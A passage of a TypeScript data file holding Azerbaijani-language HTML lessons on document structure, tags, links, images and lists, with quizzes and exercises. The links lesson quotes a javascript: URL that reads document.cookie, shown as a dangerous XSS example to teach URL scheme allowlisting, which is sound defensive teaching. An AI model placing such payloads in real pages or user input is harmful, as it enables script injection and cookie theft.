import type { Lesson } from "../types";

export const html: Lesson[] = [
  {
    slug: "giris",
    title: "HTML nədir? İlk səhifə",
    intro: "HTML (HyperText Markup Language) — veb səhifənin skeletidir. Brauzerə «bu başlıqdır, bu paraqrafdır, bu şəkildir» deyir.",
    sections: [
      {
        level: "baslangic",
        title: "İlk səhifəmiz",
        blocks: [
          { t: "analogy", text: "Ev tikirsən: HTML — divarlar, otaqlar, qapılar (struktur). CSS — boya və mebel (görünüş). JavaScript — elektrik və liftlər (hərəkət). Divarsız boya vurmaq olmaz — ona görə hər şey HTML-dən başlayır." },
          { t: "code", lang: "html", code: `<!DOCTYPE html>
<html lang="az">
  <head>
    <meta charset="UTF-8">
    <title>Mənim ilk səhifəm</title>
  </head>
  <body>
    <h1>Salam, dünya!</h1>
    <p>Bu mənim ilk veb səhifəmdir.</p>
  </body>
</html>` },
          { t: "terms", items: [
            ["HyperText", "Başqa səhifələrə link verə bilən mətn."],
            ["Markup", "«İşarələmə» — mətni teqlərlə işarələyirik."],
            ["<!DOCTYPE html>", "Brauzerə: «bu müasir HTML5 sənədidir»."],
            ["<html lang=\"az\">", "Bütün səhifənin kökü; lang dili göstərir (ekran oxuyucular və Google üçün)."],
            ["<head>", "Görünməyən məlumatlar: başlıq, kodlaşdırma, CSS linkləri."],
            ["<meta charset=\"UTF-8\">", "Ə, ş, ç, ğ kimi hərflərin düzgün görünməsi üçün."],
            ["<body>", "Ekranda görünən hər şey."],
            ["<h1>", "heading 1 — ən böyük başlıq."],
            ["<p>", "paragraph — paraqraf."],
          ]},
          { t: "p", text: "Teqlərin çoxu cüt olur: açılan <p> və bağlanan </p>. Aradakı məzmunla birlikdə buna element deyilir." },
        ],
      },
      {
        level: "orta",
        title: "Brauzer HTML-i necə oxuyur?",
        blocks: [
          { t: "p", text: "Brauzer HTML-i yuxarıdan aşağı oxuyur və teqlərdən ağac (DOM) qurur. Teqlər bir-birinin içində ola bilər — buna iç-içəlik (nesting) deyilir. Daxili teq həmişə xaricidən əvvəl bağlanmalıdır." },
          { t: "mistake", lang: "html", wrong: `<p>Bu <b>qalın</p></b>`, right: `<p>Bu <b>qalın</b></p>`, why: "Teqlər qutu içində qutu kimidir: əvvəl içdəki qutunu bağlayırsan, sonra xaricdəkini." },
          { t: "mistake", lang: "html", wrong: `<head>\n  <h1>Başlıq</h1>\n</head>`, right: `<body>\n  <h1>Başlıq</h1>\n</body>`, why: "Görünən məzmun yalnız body-də olmalıdır. Brauzer səhvi «düzəltməyə» çalışır, amma nəticə gözlənilməz olur." },
          { t: "tip", text: "VS Code-da boş .html faylında ! yazıb Tab bas — bütün skelet avtomatik yaranır (Emmet)." },
        ],
      },
      {
        level: "senior",
        title: "Parsing, rendering və keyfiyyət",
        blocks: [
          { t: "p", text: "Brauzer HTML-i bayt → simvol → token → node → DOM ardıcıllığı ilə emal edir. Paralel olaraq CSS-dən CSSOM qurulur; ikisi birləşib render ağacını yaradır, sonra layout və paint gəlir. <script> (defer/async olmadan) parser-i dayandırır — ona görə skriptlər defer ilə və ya body-nin sonunda qoşulur." },
          { t: "list", items: [
            "DOCTYPE-sız səhifə «quirks mode»-da açılır — köhnə, uyğunsuz qaydalarla render olunur.",
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> mobil üçün məcburidir.",
            "HTML parser səhvlərə dözümlüdür (error-tolerant) — bu, səhvlərin gizli qalması deməkdir. validator.w3.org ilə yoxla.",
            "Kritik resursları <link rel=\"preload\"> ilə əvvəlcədən yüklə.",
          ]},
          { t: "qa", items: [
            ["DOM nədir?", "Document Object Model — HTML-in brauzer yaddaşındakı ağac formalı obyekt modeli; JS onu dəyişə bilir."],
            ["async və defer fərqi?", "İkisi də parser-i bloklamır. async yüklənən kimi icra olunur (sıra qorunmur), defer parsing bitəndən sonra sıra ilə."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Səhifədə görünən məzmun hansı teqin içində olmalıdır?", options: ["<head>", "<body>", "<title>"], answer: 1, why: "head görünməyən məlumatlar üçündür, body — ekranda görünənlər üçün." },
        ],
      },
    ],
    exercise: {
      task: "Özün haqqında səhifə yarat: h1-də adın, altında 2 paraqraf (kimsən və hobbilərin).",
      starter: `<!DOCTYPE html>\n<html lang="az">\n  <head>\n    <meta charset="UTF-8">\n    <title></title>\n  </head>\n  <body>\n\n  </body>\n</html>\n`,
      expect: "title doldurulub, body-də bir h1 və iki p var, teqlər düzgün bağlanıb.",
    },
  },
  {
    slug: "teqler",
    title: "Teqlər, elementlər və atributlar",
    intro: "HTML-in əlifbası: teq (tag) nədir, element nədir, atribut (attribute) teqə necə əlavə məlumat verir.",
    sections: [
      {
        level: "baslangic",
        title: "Teq, element, atribut",
        blocks: [
          { t: "analogy", text: "Teq — qutunun üzərindəki etiketdir: «kitablar», «qablar». Element — etiket + qutunun içindəkilər. Atribut — etiketin üstündəki əlavə qeyd: «kövrəkdir», «rəngi: qırmızı»." },
          { t: "code", lang: "html", code: `<a href="https://google.com" target="_blank">Google-a keç</a>

<img src="pisik.jpg" alt="Yatan pişik">

<input type="email" placeholder="Email" required>` },
          { t: "terms", items: [
            ["<a>", "açılan teq (opening tag)."],
            ["</a>", "bağlanan teq (closing tag) — «/» işarəsi ilə."],
            ["element", "açılan teq + məzmun + bağlanan teq birlikdə."],
            ["href=\"...\"", "atribut: ad=\"dəyər\". Həmişə açılan teqin içində yazılır."],
            ["boş element (void)", "<img>, <input>, <br>, <meta> — içi olmur, bağlanan teqi yoxdur."],
            ["required", "boolean atribut — dəyəri yoxdur, sadəcə varlığı «hə» deməkdir."],
          ]},
          { t: "tip", text: "Teq və atribut adlarını kiçik hərflə, dəyərləri həmişə dırnaq içində yaz. Brauzer bağışlayır, amma komanda bağışlamır." },
        ],
      },
      {
        level: "orta",
        title: "Qlobal atributlar və tez-tez səhvlər",
        blocks: [
          { t: "p", text: "Bəzi atributlar hər teqdə işləyir — onlara qlobal atributlar deyilir: id (unikal ad), class (qrup adı, CSS üçün), title (üzərinə gələndə ipucu), hidden (gizlət), lang, data-* (öz məlumatın)." },
          { t: "code", lang: "html", code: `<section id="elaqe" class="kart kart--esas" data-user-id="42">
  <p title="Bu bir ipucudur">Üzərimə gəl</p>
</section>` },
          { t: "list", items: [
            "id səhifədə yalnız BİR dəfə ola bilər; class istənilən qədər.",
            "class-a bir neçə ad boşluqla yazılır: class=\"kart aktiv\".",
            "data-* atributlarını JS-də element.dataset.userId kimi oxuyursan.",
          ]},
          { t: "mistake", lang: "html", wrong: `<img src="logo.png">`, right: `<img src="logo.png" alt="Şirkət loqosu">`, why: "alt olmadan kor istifadəçi və Google şəklin nə olduğunu bilmir; şəkil yüklənməsə də mətn görünür." },
          { t: "mistake", lang: "html", wrong: `<div id="menyu"></div>\n<div id="menyu"></div>`, right: `<div class="menyu"></div>\n<div class="menyu"></div>`, why: "id unikal olmalıdır. Təkrarlanan şeylər üçün class işlət." },
        ],
      },
      {
        level: "senior",
        title: "Atribut vs property, data-* dizaynı",
        blocks: [
          { t: "p", text: "HTML atributu ilkin dəyərdir, DOM property isə canlı vəziyyətdir. <input value=\"a\"> yazıb istifadəçi «b» daxil etsə, input.getAttribute(\"value\") yenə \"a\", input.value isə \"b\" qaytarır. Bu fərq formalarla işləyəndə çox bug yaradır." },
          { t: "list", items: [
            "Boolean atributlarda disabled=\"false\" da söndürür! Atributun olması kifayətdir — silmək lazımdır.",
            "data-* yalnız UI vəziyyəti üçündür; həssas məlumatı (token, parol) heç vaxt HTML-ə yazma — hamı görür.",
            "Xüsusi (custom) atribut icad etmə (<div rengi=\"qirmizi\">) — validator səhv verir; data-rengi işlət.",
          ]},
          { t: "qa", items: [
            ["Void element nədir?", "Məzmunu olmayan, bağlanan teqi olmayan element: img, input, br, hr, meta, link."],
            ["Atribut ilə property fərqi?", "Atribut HTML-dəki başlanğıc dəyərdir, property DOM obyektinin cari dəyəridir."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Hansı element boşdur (bağlanan teqi yoxdur)?", options: ["<p>", "<img>", "<a>"], answer: 1, why: "img məzmun saxlamır — şəkil src atributundan gəlir." },
          { t: "quiz", q: "Səhifədə bir neçə elementə eyni stil vermək üçün nə işlədirik?", options: ["id", "class", "title"], answer: 1, why: "id unikaldır, class isə təkrarlana bilər." },
        ],
      },
    ],
    exercise: {
      task: "Bir link (yeni tabda açılsın), alt-ı olan bir şəkil və 'kart' class-ı olan div yarat.",
      starter: `<!-- Bura yaz -->\n`,
      expect: "a teqində href və target=\"_blank\" var; img-də src və mənalı alt var; div class=\"kart\"; dırnaqlar və bağlanmalar düzgündür.",
    },
  },
  {
    slug: "struktur",
    title: "Sənəd strukturu: html, head, body",
    intro: "Hər HTML sənədinin eyni skeleti var. Bu dərsdə head-in içində nələrin olduğunu və niyə vacib olduğunu öyrənirik.",
    sections: [
      {
        level: "baslangic",
        title: "Skelet",
        blocks: [
          { t: "analogy", text: "Kitab kimi düşün: head — üz qabığı və arxadakı məlumat (ad, müəllif, dil). body — kitabın səhifələri. Oxucu səhifələri oxuyur, amma kitabxana kitabı üz qabığına görə tapır." },
          { t: "code", lang: "html", code: `<!DOCTYPE html>
<html lang="az">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Kod Akademiyası</title>
    <meta name="description" content="Proqramlaşdırmanı Azərbaycanca öyrən">
    <link rel="icon" href="/favicon.ico">
    <link rel="stylesheet" href="style.css">
    <script src="app.js" defer></script>
  </head>
  <body>
    ...
  </body>
</html>` },
          { t: "terms", items: [
            ["viewport", "Mobil cihaza «ekran enini olduğu kimi götür» deyir. Olmasa, telefonda səhifə kiçilmiş görünür."],
            ["<title>", "Brauzer tabındakı və Google nəticəsindəki ad."],
            ["description", "Google axtarışında başlığın altındakı qısa mətn."],
            ["<link rel=\"stylesheet\">", "Xarici CSS faylını qoşur."],
            ["rel=\"icon\"", "Tabdakı kiçik ikon (favicon)."],
            ["defer", "Skript HTML oxunub bitəndən sonra işə düşsün."],
          ]},
        ],
      },
      {
        level: "orta",
        title: "Sıra niyə vacibdir?",
        blocks: [
          { t: "p", text: "charset head-in ən yuxarısında olmalıdır — brauzer mətni oxumağa başlamazdan əvvəl kodlaşdırmanı bilməlidir. CSS head-də qoşulur ki, səhifə stilsiz «yanıb-sönməsin». JS isə defer ilə qoşulur ki, səhifənin görünməsini gecikdirməsin." },
          { t: "mistake", lang: "html", wrong: `<head>\n  <script src="app.js"></script>\n</head>`, right: `<head>\n  <script src="app.js" defer></script>\n</head>`, why: "defer olmadan brauzer skripti yükləyib icra edənə qədər səhifəni qurmağı dayandırır. Üstəlik, skript hələ yaranmamış elementləri tapa bilmir." },
          { t: "mistake", lang: "html", wrong: `<html>`, right: `<html lang="az">`, why: "lang olmasa ekran oxuyucu mətni səhv tələffüz edir, brauzer isə səhv tərcümə təklif edir." },
          { t: "tip", text: "Bir səhifədə yalnız bir <title> və bir <body> olur." },
        ],
      },
      {
        level: "senior",
        title: "Head-in optimallaşdırılması",
        blocks: [
          { t: "list", items: [
            "Head-in ilk 1024 baytında charset olmalıdır — standart tələbidir.",
            "<link rel=\"preconnect\" href=\"https://fonts.example.com\"> — xarici serverə qoşulmanı əvvəlcədən açır.",
            "<link rel=\"preload\" as=\"font\"> — kritik şrifti erkən yüklə; amma çox preload prioritetləri qarışdırır.",
            "type=\"module\" skriptlər avtomatik defer kimi davranır.",
            "Open Graph (og:title, og:image) — link sosial şəbəkədə paylaşılanda görünən kart.",
          ]},
          { t: "qa", items: [
            ["viewport meta olmasa nə olur?", "Mobil brauzer səhifəni ~980px enində render edib kiçildir; responsive CSS işləmir."],
            ["CSS niyə render-blocking-dir?", "Brauzer stilsiz məzmun göstərməmək üçün CSSOM hazır olana qədər rəsm çəkmir."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Mobil cihazda səhifənin düzgün ölçüdə görünməsi üçün hansı teq lazımdır?", options: ["<meta charset>", "<meta name=\"viewport\">", "<title>"], answer: 1, why: "viewport ekran enini cihazın eninə bərabər edir." },
        ],
      },
    ],
    exercise: {
      task: "Tam head yaz: charset, viewport, title, description və style.css-ə link. body-də bir h1 olsun.",
      starter: `<!DOCTYPE html>\n<html lang="az">\n  <head>\n\n  </head>\n  <body>\n\n  </body>\n</html>\n`,
      expect: "head-də charset UTF-8 (ən yuxarıda), viewport, dolu title, meta description, link rel=stylesheet var; body-də h1.",
    },
  },
  {
    slug: "metn",
    title: "Mətn teqləri: başlıq, paraqraf, vurğu",
    intro: "Mətni mənasına görə işarələmək: başlıq iyerarxiyası, paraqraflar, vurğu, sitat və kod.",
    sections: [
      {
        level: "baslangic",
        title: "Başlıqlar və paraqraflar",
        blocks: [
          { t: "analogy", text: "Başlıqlar kitabın mündəricatı kimidir: h1 — kitabın adı, h2 — fəsillər, h3 — fəslin bölmələri. Fəsil olmadan bölmə olmur." },
          { t: "code", lang: "html", code: `<h1>Azərbaycan mətbəxi</h1>
<h2>Şirniyyatlar</h2>
<h3>Paxlava</h3>
<p>Paxlava <strong>bayram</strong> şirniyyatıdır və <em>çox</em> şirindir.</p>
<p>Birinci sətir<br>ikinci sətir</p>
<hr>
<blockquote>Dil xalqın ruhudur.</blockquote>
<p>Konsolda <code>console.log()</code> yaz.</p>` },
          { t: "terms", items: [
            ["<h1>…<h6>", "6 səviyyəli başlıq. h1 ən vacibidir."],
            ["<strong>", "güclü vacibliyi bildirir (qalın görünür)."],
            ["<em>", "emphasis — səsli vurğu (maili görünür)."],
            ["<br>", "line break — sətirdən keçid."],
            ["<hr>", "mövzu dəyişikliyi (üfüqi xətt)."],
            ["<blockquote>", "başqa mənbədən sitat."],
            ["<code>", "kod parçası (mono şrift)."],
          ]},
          { t: "tip", text: "HTML-də boşluqlar və yeni sətirlər birləşir: 10 boşluq = 1 boşluq. Yeni paraqraf üçün yeni <p> aç." },
        ],
      },
      {
        level: "orta",
        title: "Görünüş yox, məna",
        blocks: [
          { t: "p", text: "Teqi görünüşünə görə yox, mənasına görə seç. Böyük mətn lazımdırsa h1 yox, CSS işlət. strong ilə b, em ilə i görünüşcə eynidir, amma strong/em məna daşıyır — ekran oxuyucu onları vurğulu oxuyur." },
          { t: "mistake", lang: "html", wrong: `<h1>Ana səhifə</h1>\n<h4>Xəbərlər</h4>`, right: `<h1>Ana səhifə</h1>\n<h2>Xəbərlər</h2>`, why: "Səviyyə atlamaq olmaz — h1-dən sonra h2 gəlir. Kiçik görünüş lazımdırsa CSS ilə kiçilt." },
          { t: "mistake", lang: "html", wrong: `<p>Sətir 1<br><br><br>Sətir 2</p>`, right: `<p>Sətir 1</p>\n<p>Sətir 2</p>`, why: "Boşluq yaratmaq üçün br yığmaq olmaz — bu CSS-in (margin) işidir." },
          { t: "list", items: [
            "<mark> — vurğulanmış (sarı fon), <small> — kiçik qeyd, <del>/<ins> — silinmiş/əlavə olunmuş mətn.",
            "<pre> boşluqları olduğu kimi saxlayır — kod blokları üçün <pre><code> birlikdə işlədilir.",
            "Xüsusi simvollar: &lt; → <, &gt; → >, &amp; → &, &nbsp; → qırılmayan boşluq.",
          ]},
        ],
      },
      {
        level: "senior",
        title: "Sənəd konturu və SEO",
        blocks: [
          { t: "p", text: "Ekran oxuyucu istifadəçiləri səhifədə başlıqdan-başlığa tullanaraq gəzir (NVDA-da H düyməsi). Başlıq iyerarxiyası pozulanda bu naviqasiya çökür. Google da başlıqları məzmun strukturunu anlamaq üçün işlədir." },
          { t: "list", items: [
            "Səhifədə bir h1 — səhifənin əsas mövzusu. (Texniki olaraq çox ola bilər, amma praktikada bir.)",
            "Başlığa ikon və ya şəkil qoyursan — alt mətni başlığın mənasını daşımalıdır.",
            "<abbr title=\"HyperText Markup Language\">HTML</abbr> — qısaltmanı açır.",
            "<time datetime=\"2026-11-13\">13 noyabr</time> — tarix maşın üçün oxunaqlı olur.",
          ]},
          { t: "qa", items: [
            ["b ilə strong fərqi?", "b sadəcə vizual qalınlıqdır, strong semantik vacibliyi bildirir."],
            ["< simvolunu mətndə necə göstərək?", "&lt; entity-si ilə, yoxsa brauzer onu teq başlanğıcı sayar."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "h2-dən sonra alt bölmə üçün hansı başlıq gəlir?", options: ["h4", "h3", "h1"], answer: 1, why: "Səviyyələr ardıcıl gedir, atlanmır." },
          { t: "quiz", q: "Mətndə vacib xəbərdarlığı hansı teqlə işarələmək düzgündür?", options: ["<b>", "<strong>", "<big>"], answer: 1, why: "strong məna daşıyır, b yalnız görünüşdür." },
        ],
      },
    ],
    exercise: {
      task: "Resept səhifəsi: h1 (yeməyin adı), h2 'Tərkib' və h2 'Hazırlanma', hər birinin altında paraqraf. Bir sözü strong, birini em et.",
      starter: `<!-- Resept -->\n`,
      expect: "bir h1, iki h2, səviyyə atlanmayıb; paraqraflar p ilə; strong və em düzgün işlədilib; br boşluq üçün yığılmayıb.",
    },
  },
  {
    slug: "linkler",
    title: "Linklər və naviqasiya",
    intro: "Linklər (<a>) internetin «yollarıdır». Başqa səhifəyə, səhifənin bir hissəsinə, emailə və ya fayla aparır.",
    sections: [
      {
        level: "baslangic",
        title: "<a> teqi",
        blocks: [
          { t: "analogy", text: "Link — yol nişanıdır. href — ünvan, linkin mətni — nişanın üzərində yazılan. Nişanda «bura» yazmaq faydasızdır, «Bakıya 20 km» yazmaq lazımdır." },
          { t: "code", lang: "html", code: `<a href="https://wikipedia.org">Vikipediya</a>
<a href="/haqqimizda">Haqqımızda</a>
<a href="elaqe.html">Əlaqə</a>
<a href="#qiymetler">Qiymətlərə keç</a>
<a href="mailto:info@example.com">Bizə yaz</a>
<a href="tel:+994501234567">Zəng et</a>
<a href="cv.pdf" download>CV-ni yüklə</a>

<h2 id="qiymetler">Qiymətlər</h2>` },
          { t: "terms", items: [
            ["href", "hypertext reference — linkin ünvanı."],
            ["mütləq (absolute) URL", "https:// ilə başlayan tam ünvan — başqa saytlar üçün."],
            ["nisbi (relative) URL", "cari fayla nəzərən yol: elaqe.html, ../index.html."],
            ["/haqqimizda", "sayt kökündən başlayan yol."],
            ["#qiymetler", "anchor — id=\"qiymetler\" olan elementə sürüşdürür."],
            ["download", "faylı açmaq əvəzinə yükləyir."],
          ]},
        ],
      },
      {
        level: "orta",
        title: "Yeni tab, nav və düzgün link mətni",
        blocks: [
          { t: "code", lang: "html", code: `<nav>
  <a href="/">Ana səhifə</a>
  <a href="/dersler" aria-current="page">Dərslər</a>
  <a href="/elaqe">Əlaqə</a>
</nav>

<a href="https://github.com" target="_blank" rel="noopener noreferrer">GitHub</a>` },
          { t: "list", items: [
            "<nav> — əsas naviqasiya bloku; ekran oxuyucu onu ayrıca tanıyır.",
            "aria-current=\"page\" — hazırda olduğun səhifəni bildirir.",
            "target=\"_blank\" — yeni tabda açır. Bunu yalnız xarici saytlar üçün işlət.",
          ]},
          { t: "mistake", lang: "html", wrong: `Dərslər üçün <a href="/dersler">bura klikləyin</a>`, right: `<a href="/dersler">Bütün dərslərə bax</a>`, why: "Ekran oxuyucu linkləri siyahı kimi oxuyur — 10 dənə «bura klikləyin» heç nə demir. Mətn özü ünvanı izah etməlidir." },
          { t: "mistake", lang: "html", wrong: `<a onclick="openMenu()">Menyu</a>`, right: `<button type="button" onclick="openMenu()">Menyu</button>`, why: "Link başqa yerə aparır, düymə əməliyyat edir. href-siz a klaviatura ilə fokuslanmır." },
        ],
      },
      {
        level: "senior",
        title: "Təhlükəsizlik və SEO",
        blocks: [
          { t: "p", text: "target=\"_blank\" ilə açılan səhifə köhnə brauzerlərdə window.opener vasitəsilə sənin səhifəni başqa ünvana yönləndirə bilərdi (tabnabbing). Müasir brauzerlər noopener-i default edir, amma rel=\"noopener\" yazmaq hələ də yaxşı vərdişdir. noreferrer əlavə olaraq hansı saytdan gəldiyini gizlədir." },
          { t: "list", items: [
            "rel=\"nofollow\" / \"ugc\" / \"sponsored\" — Google-a «bu linkə səs vermirəm» deyir (reklam, istifadəçi şərhləri).",
            "href=\"javascript:...\" işlətmə — XSS riski və a11y problemi.",
            "İstifadəçi daxil etdiyi URL-i href-ə qoymazdan əvvəl protokolu yoxla (yalnız http/https).",
            "Next.js-də daxili linklər üçün <Link> — prefetch və səhifə yenilənmədən keçid.",
          ]},
          { t: "qa", items: [
            ["Link ilə button nə vaxt işlədilir?", "Ünvan dəyişirsə — a; səhifədə əməliyyatdırsa (aç, göndər, sil) — button."],
            ["rel=noopener nə edir?", "Yeni səhifənin window.opener-ə çıxışını kəsir."],
          ]},
          { t: "h", text: "Təhlükəsiz linklər: rel və təhlükəli sxemlər" },
          { t: "code", lang: "html", code: `<!-- Xarici link: opener və Referer sızmasının qarşısını al -->
<a href="https://example.com" target="_blank" rel="noopener noreferrer">Xarici sayt</a>

<!-- İstifadəçi şərhindəki link: SEO spam-ı və səlahiyyət ötürülməsini kəs -->
<a href="https://example.com" rel="nofollow ugc noopener">Şərh müəllifinin saytı</a>

<!-- TƏHLÜKƏLİ: istifadəçi bu dəyəri javascript:alert(document.cookie) edə bilər -->
<a href="javascript:alert(document.cookie)">Kliklə</a>` },
          { t: "list", items: [
            "noopener — açılan səhifənin window.opener ilə sənin tabına çıxışını kəsir (reverse tabnabbing).",
            "noreferrer — Referer başlığını göndərmir (və noopener davranışını da verir). Daxili URL-lərdəki gizli tokenləri sızdırmamaq üçün vacibdir.",
            "Sxem ağ siyahısı: istifadəçidən gələn URL-i yalnız http:, https: (və lazım gəlsə mailto:) icazə ver; javascript:, data:, vbscript: sxemlərini rədd et.",
            "Yoxlamanı mətn üzərində deyil, URL parser ilə et: new URL(girish).protocol — «JaVaScRiPt:» və ya boşluq/yeni sətirlə gizlədilmiş variantlar regex-i aldada bilər.",
          ]},
          { t: "mistake", lang: "js", wrong: `if (url.startsWith("http")) link.href = url; // "httpevil:..." və ya "http.evil.com" keçir`, right: `const u = new URL(url, location.origin);
if (u.protocol === "https:" || u.protocol === "http:") link.href = u.href;`, why: "startsWith ilə yoxlama çox kobuddur. URL-i parser ilə ayrıştırıb protokolu dəqiq müqayisə et." },
          { t: "qa", items: [
            ["Reverse tabnabbing nədir?", "target=_blank ilə açılan sayt window.opener.location-u dəyişib orijinal tabı saxta giriş səhifəsinə yönləndirir. rel=noopener bunu bağlayır (müasir brauzerlər target=_blank üçün onu default edir, amma açıq yazmaq sığortadır)."],
            ["Niyə javascript: URL-i təhlükəlidir?", "Klik zamanı səhifənin kontekstində kod icra olunur — bu, XSS-dir. CSP də onu bloklaya bilər, amma əsas müdafiə sxem ağ siyahısıdır."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Eyni səhifədəki id=\"son\" olan bölməyə link necə yazılır?", options: ["href=\"son\"", "href=\"#son\"", "href=\"/son\""], answer: 1, why: "# işarəsi səhifə daxilindəki id-ə işarə edir." },
        ],
      },
    ],
    exercise: {
      task: "nav içində 3 link (Ana səhifə, Dərslər, Əlaqə), yeni tabda açılan təhlükəsiz xarici link və səhifənin aşağısındakı id=\"son\" bölməsinə anchor link yarat.",
      starter: `<!-- Naviqasiya -->\n`,
      expect: "nav içində 3 mənalı mətnli a; xarici linkdə target=_blank və rel=noopener; href=\"#son\" və id=\"son\" olan element var.",
    },
  },
  {
    slug: "sekiller",
    title: "Şəkillər və media",
    intro: "Şəkil, video və audio əlavə etmək; düzgün format, ölçü və alt mətn seçmək.",
    sections: [
      {
        level: "baslangic",
        title: "<img>, <video>, <audio>",
        blocks: [
          { t: "analogy", text: "img teqi divara asılmış çərçivədir: src — çərçivəyə qoyulan şəklin ünvanı, alt — altındakı lövhəcik. Şəkil düşüb itsə də, lövhəcik nəyin asıldığını deyir." },
          { t: "code", lang: "html", code: `<img src="img/baki.jpg" alt="Gecə vaxtı Alov qüllələri" width="800" height="450">

<figure>
  <img src="qrafik.png" alt="2026-cı il satış qrafiki: dekabrda zirvə">
  <figcaption>Şəkil 1. İllik satış</figcaption>
</figure>

<video src="ders.mp4" controls poster="kapak.jpg"></video>
<audio src="mahni.mp3" controls></audio>` },
          { t: "terms", items: [
            ["src", "source — faylın ünvanı."],
            ["alt", "alternativ mətn: şəkil görünməyəndə və ekran oxuyucu üçün."],
            ["width / height", "şəklin ölçüsü (piksel). Səhifənin «tullanmasının» qarşısını alır."],
            ["<figure>", "şəkil + izah bir bütöv kimi."],
            ["<figcaption>", "figure-un altyazısı."],
            ["controls", "oynat/dayandır düymələrini göstərir."],
            ["poster", "video başlamazdan əvvəl görünən şəkil."],
          ]},
          { t: "tip", text: "Dekorativ şəkil üçün (məna daşımayan bəzək) alt=\"\" yaz — boş, amma mövcud. Ekran oxuyucu onu ötürür." },
        ],
      },
      {
        level: "orta",
        title: "Format və ölçü seçimi",
        blocks: [
          { t: "list", items: [
            "JPG — fotolar. PNG — şəffaflıq lazım olanda. SVG — ikon və loqolar (vektor, kəskin qalır).",
            "WebP / AVIF — müasir formatlar, JPG-dən 30–50% kiçik.",
            "Telefonda 4000px-lik şəkil yükləmək trafiki yandırır — ölçünü ehtiyaca görə kiçilt.",
          ]},
          { t: "code", lang: "html", code: `<picture>
  <source srcset="foto.avif" type="image/avif">
  <source srcset="foto.webp" type="image/webp">
  <img src="foto.jpg" alt="Dəniz kənarı" width="1200" height="800" loading="lazy">
</picture>` },
          { t: "p", text: "picture brauzerə seçim verir: AVIF-i başa düşürsə onu, yoxsa WebP-ni, o da olmasa JPG-ni götürür. loading=\"lazy\" — şəkil ekrana yaxınlaşanda yüklənir." },
          { t: "mistake", lang: "html", wrong: `<img src="pisik.jpg" alt="şəkil">`, right: `<img src="pisik.jpg" alt="Pəncərə önündə yatan boz pişik">`, why: "«şəkil», «foto» sözləri heç nə demir. alt şəklin nə göstərdiyini təsvir etməlidir." },
          { t: "mistake", lang: "html", wrong: `<img src="hero.jpg" alt="..." loading="lazy">  <!-- ekranın ən yuxarısı -->`, right: `<img src="hero.jpg" alt="..." fetchpriority="high">`, why: "İlk ekranda görünən əsas şəkli lazy etmək onu gecikdirir və LCP-ni pisləşdirir." },
        ],
      },
      {
        level: "senior",
        title: "Responsive şəkillər və Core Web Vitals",
        blocks: [
          { t: "code", lang: "html", code: `<img
  src="foto-800.jpg"
  srcset="foto-400.jpg 400w, foto-800.jpg 800w, foto-1600.jpg 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  alt="Məhsul" width="800" height="600">` },
          { t: "p", text: "srcset faylları və onların həqiqi enini (w) sadalayır, sizes isə şəklin ekranda nə qədər yer tutacağını deyir. Brauzer ekran eni və piksel sıxlığına (DPR) baxıb ən uyğun faylı özü seçir." },
          { t: "list", items: [
            "width/height atributları brauzerə aspect-ratio verir → CLS (layout shift) olmur.",
            "LCP şəklini preload et və ya fetchpriority=\"high\" ver.",
            "decoding=\"async\" — şəkli açmaq əsas axını bloklamasın.",
            "Video üçün autoplay yalnız muted ilə işləyir; mobil trafikə görə preload=\"none\" düşün.",
            "Next.js-də next/image bunların çoxunu avtomatik edir.",
          ]},
          { t: "qa", items: [
            ["srcset-də w və x fərqi?", "w — faylın piksel eni (sizes ilə), x — sabit ölçülü şəkil üçün piksel sıxlığı (1x, 2x)."],
            ["CLS-in qarşısını necə alırıq?", "Şəkillərə width/height və ya CSS aspect-ratio verməklə yer əvvəlcədən ayrılır."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Loqo üçün hansı format ən yaxşısıdır?", options: ["JPG", "SVG", "GIF"], answer: 1, why: "SVG vektordur — istənilən ölçüdə kəskin qalır və çox yüngüldür." },
          { t: "quiz", q: "Bəzək şəklinin alt-ı necə olmalıdır?", options: ["alt yazılmır", "alt=\"\"", "alt=\"bəzək\""], answer: 1, why: "Boş alt ekran oxuyucuya «bunu ötür» deyir; alt-ın olmaması isə səhvdir." },
        ],
      },
    ],
    exercise: {
      task: "figure içində şəkil (mənalı alt, width, height, loading=lazy) və figcaption yaz. Altına controls-lu video əlavə et.",
      starter: `<!-- Media -->\n`,
      expect: "figure > img + figcaption; img-də src, təsviri alt, width, height, loading=\"lazy\"; video-da src və controls.",
    },
  },
  {
    slug: "siyahilar",
    title: "Siyahılar",
    intro: "Nömrəsiz (ul), nömrəli (ol) və təsvir (dl) siyahıları. Menyular da əslində siyahıdır.",
    sections: [
      {
        level: "baslangic",
        title: "ul, ol, li",
        blocks: [
          { t: "analogy", text: "ul — bazarlıq siyahısı: sıra fərq etmir. ol — resept addımları: sıra vacibdir, əvvəl un, sonra yumurta. li — hər bir sətir." },
          { t: "code", lang: "html", code: `<ul>
  <li>Alma</li>
  <li>Çörək</li>
  <li>Süd</li>
</ul>

<ol>
  <li>Suyu qaynat</li>
  <li>Çayı dəmlə</li>
  <li>5 dəqiqə gözlə</li>
</ol>` },
          { t: "terms", items: [
            ["<ul>", "unordered list — nömrəsiz siyahı (nöqtələrlə)."],
            ["<ol>", "ordered list — nömrəli siyahı."],
            ["<li>", "list item — siyahının elementi."],
          ]},
          { t: "tip", text: "ul və ol-un birbaşa uşağı YALNIZ li ola bilər." },
        ],
      },
      {
        level: "orta",
        title: "İç-içə siyahılar, ol atributları, dl",
        blocks: [
          { t: "code", lang: "html", code: `<ul>
  <li>Front End
    <ul>
      <li>HTML</li>
      <li>CSS</li>
    </ul>
  </li>
  <li>Back End</li>
</ul>

<ol start="5" reversed type="A">
  <li>Beşinci</li>
</ol>

<dl>
  <dt>API</dt>
